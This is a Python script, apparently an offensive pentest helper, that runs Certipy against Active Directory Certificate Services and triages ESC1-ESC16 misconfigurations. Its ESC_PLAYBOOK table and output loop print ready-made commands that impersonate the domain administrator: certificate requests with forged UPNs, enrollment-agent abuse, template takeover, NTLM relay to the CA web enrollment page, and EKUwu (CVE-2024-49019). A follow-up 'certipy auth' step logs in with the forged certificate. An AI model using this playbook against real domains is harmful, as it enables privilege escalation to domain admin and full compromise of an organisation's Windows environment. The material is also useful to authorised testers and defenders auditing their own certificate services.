#!/usr/bin/env python3
"""
adcs_esc_finder.py - Run Certipy and triage ESC1-ESC16 findings with follow-up commands.

Invokes `certipy find -vulnerable -json`, parses the result, and for each vulnerable
template / CA setting prints the ESC class, why it is exploitable, and the exact certipy
command to weaponize it (request a cert as a high-value principal, then authenticate).
Covers the modern set: ESC1-4, ESC6-11, ESC13, ESC15 (EKUwu / CVE-2024-49019), ESC16.

Usage:
    python3 adcs_esc_finder.py -d corp.local -u user -p 'Pass' --dc-ip 10.0.0.10
    python3 adcs_esc_finder.py --json certipy_output.json   # parse an existing run
    python3 adcs_esc_finder.py -d corp.local -u user -H :<NT> --dc-ip 10.0.0.10 --target administrator

Dependencies:
    pip install certipy-ad     # provides 'certipy' (v5+ for ESC9-ESC16)
Notes:
    - certipy writes <prefix>_Certipy.json; this script auto-discovers it.
    - Read-only enumeration; the printed exploit commands are NOT auto-executed.
"""
import argparse
import glob
import json
import os
import subprocess
import sys

# ESC class -> (one-line reason, weaponization hint template)
ESC_PLAYBOOK = {
    "ESC1": ("Enrollee supplies subject (SAN) + client-auth EKU",
             "certipy req -u {u} -p {p} -dc-ip {dc} -ca {ca} -template {tpl} -upn {tgt}@{d} -sid <ADMIN_SID>"),
    "ESC2": ("Any-Purpose / no EKU -> usable for client auth",
             "certipy req -u {u} -p {p} -ca {ca} -template {tpl} -upn {tgt}@{d}"),
    "ESC3": ("Enrollment-Agent EKU -> request on behalf of others",
             "certipy req -u {u} -p {p} -ca {ca} -template {tpl} -on-behalf-of '{d}\\\\{tgt}' -pfx agent.pfx"),
    "ESC4": ("Write/GenericAll over template -> make it ESC1, then restore",
             "certipy template -u {u} -p {p} -template {tpl} -save-old   # then ESC1, then restore"),
    "ESC6": ("CA has EDITF_ATTRIBUTESUBJECTALTNAME2 -> SAN injection any template",
             "certipy req -u {u} -p {p} -ca {ca} -template User -upn {tgt}@{d}"),
    "ESC7": ("ManageCA/ManageCertificates rights on CA",
             "certipy ca -u {u} -p {p} -ca {ca} -add-officer {u}   # enable template / approve"),
    "ESC8": ("HTTP/RPC enrollment without EPA -> NTLM relay (see coerce_relay_chain.sh)",
             "ntlmrelayx -t http://{ca}/certsrv/certfnsh.asp -smb2support --adcs --template DomainController"),
    "ESC9": ("Template NO_SECURITY_EXTENSION -> SID mapping bypass (chain w/ ESC1/Certifried)",
             "certipy req -u {u} -p {p} -ca {ca} -template {tpl} -upn {tgt}@{d}"),
    "ESC10": ("Weak cert mapping (StrongCertificateBindingEnforcement) -> mapping bypass",
              "certipy req -u {u} -p {p} -ca {ca} -template User -upn {tgt}@{d}"),
    "ESC11": ("IF_ENFORCEENCRYPTICERTREQUEST off -> relay over RPC (ICPR)",
              "certipy relay -target rpc://{ca} -ca {ca}"),
    "ESC13": ("Issuance-policy OID linked to a privileged group -> enroll = group member",
              "certipy req -u {u} -p {p} -ca {ca} -template {tpl}"),
    "ESC15": ("EKUwu / CVE-2024-49019: Schema v1 template, EKU not sanitized -> inject client-auth",
              "certipy req -u {u} -p {p} -dc-ip {dc} -ca {ca} -template {tpl} -upn {tgt}@{d} "
              "-application-policies 'Client Authentication'"),
    "ESC16": ("CA-wide SID security extension disabled (ESC9 globally) -> domain-wide mapping bypass",
              "certipy req -u {u} -p {p} -ca {ca} -template User -upn {tgt}@{d}"),
}


def run_certipy(args):
    auth = ["-u", f"{args.username}@{args.domain}"]
    if args.hashes:
        auth += ["-hashes", args.hashes if ":" in args.hashes else f":{args.hashes}"]
    else:
        auth += ["-p", args.password]
    cmd = ["certipy", "find", "-vulnerable", "-json", "-dc-ip", args.dc_ip,
           "-output", "certipy"] + auth
    print(f"[>] {' '.join(cmd)}")
    rc = subprocess.run(cmd, check=False).returncode
    if rc != 0:
        print("[!] certipy returned non-zero; trying to parse any JSON produced.")
    matches = sorted(glob.glob("certipy_*.json") + glob.glob("*_Certipy.json"),
                     key=os.path.getmtime, reverse=True)
    if not matches:
        sys.exit("[-] No Certipy JSON output found.")
    return matches[0]


def classify(data, args):
    """Yield (esc, ca, template) tuples from Certipy JSON."""
    found = []
    # Templates
    templates = data.get("Certificate Templates", {})
    if isinstance(templates, dict):
        templates = templates.values()
    for tpl in templates:
        name = tpl.get("Template Name") or tpl.get("Name") or "?"
        ca = (tpl.get("Certificate Authorities") or ["<CA>"])
        ca = ca[0] if isinstance(ca, list) and ca else "<CA>"
        vulns = tpl.get("[!] Vulnerabilities") or tpl.get("Vulnerabilities") or {}
        for key in vulns:
            for esc in ESC_PLAYBOOK:
                if esc in str(key):
                    found.append((esc, ca, name))
    # CA-level (ESC6/7/8/11/16)
    cas = data.get("Certificate Authorities", {})
    if isinstance(cas, dict):
        cas = cas.values()
    for ca in cas:
        name = ca.get("CA Name") or ca.get("Name") or "<CA>"
        vulns = ca.get("[!] Vulnerabilities") or ca.get("Vulnerabilities") or {}
        for key in vulns:
            for esc in ESC_PLAYBOOK:
                if esc in str(key):
                    found.append((esc, name, "<n/a>"))
    return found


def main():
    ap = argparse.ArgumentParser(description="Certipy ESC1-16 triage")
    ap.add_argument("-d", "--domain")
    ap.add_argument("-u", "--username")
    ap.add_argument("-p", "--password", default="")
    ap.add_argument("-H", "--hashes")
    ap.add_argument("--dc-ip")
    ap.add_argument("--json", help="parse an existing Certipy JSON instead of running")
    ap.add_argument("--target", default="administrator",
                    help="principal to impersonate in printed commands")
    args = ap.parse_args()

    if args.json:
        path = args.json
    else:
        if not (args.domain and args.username and args.dc_ip):
            sys.exit("[-] need -d/-u/--dc-ip to run certipy (or --json to parse)")
        path = run_certipy(args)

    with open(path) as f:
        data = json.load(f)

    findings = classify(data, args)
    if not findings:
        print("[i] No ESC vulnerabilities classified in output.")
        return

    print(f"\n=== ADCS ESC findings ({len(findings)}) from {path} ===\n")
    seen = set()
    for esc, ca, tpl in findings:
        sig = (esc, ca, tpl)
        if sig in seen:
            continue
        seen.add(sig)
        reason, hint = ESC_PLAYBOOK[esc]
        cmd = hint.format(u=f"{args.username}@{args.domain}" if args.username else "user@dom",
                          p=args.password or "<pass>",
                          dc=args.dc_ip or "<DC_IP>", ca=ca, tpl=tpl,
                          tgt=args.target, d=args.domain or "corp.local")
        print(f"[!] {esc}  CA={ca}  Template={tpl}")
        print(f"     why: {reason}")
        print(f"     run: {cmd}")
        print(f"     then: certipy auth -pfx {args.target}.pfx -dc-ip {args.dc_ip or '<DC_IP>'}\n")


if __name__ == "__main__":
    main()
